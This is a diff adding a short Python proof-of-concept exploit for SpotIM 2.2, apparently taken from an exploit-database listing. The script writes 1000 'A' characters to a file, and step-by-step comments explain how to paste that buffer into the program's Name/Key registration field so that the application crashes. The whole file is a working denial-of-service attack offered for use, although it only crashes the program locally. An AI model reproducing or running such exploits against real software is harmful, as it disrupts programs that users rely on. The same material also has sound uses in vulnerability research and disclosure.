@@ -1,0 +1,22 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: SpotIM 2.2 - 'Name/Key' Denial of Service (PoC)
+# Date: 09/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: http://www.nsauditor.com
+# Software Link http://www.nsauditor.com/downloads/spotim_setup.exe
+# Version: 2.2
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "SpotIM.py", it will create a new file "SpotIM.txt"
+# 2.- Copy the text from the generated SpotIM.txt file to clipboard
+# 3.- Open SpotIM
+# 4.  Select "Register" > "Enter Registration Code..."
+# 5.- Paste clipboard in the Name/Key field 
+# 6.- Click 'OK'
+# 7.- Crashed
+
+buffer = "\x41" * 1000
+f = open ("SpotIM.txt", "w")
+f.write(buffer)
+f.close()
